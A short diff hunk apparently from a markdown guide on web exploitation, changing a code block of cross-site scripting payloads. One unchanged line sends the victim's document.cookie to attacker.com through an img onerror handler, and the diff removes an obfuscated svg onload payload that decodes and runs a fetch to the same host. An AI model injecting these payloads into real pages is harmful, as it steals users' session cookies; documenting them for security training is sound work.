@@ -290,7 +290,7 @@ document.addEventListener('keypress', (e) => {
 <img src=x onerror="fetch('https://attacker.com/steal?data='+document.cookie)">
 
 <!-- Profile bio exploitation -->
-<svg/onload="eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tJyk='))">
+<svg/>
 ```
 
 **Broken Access Control Exploitation:**
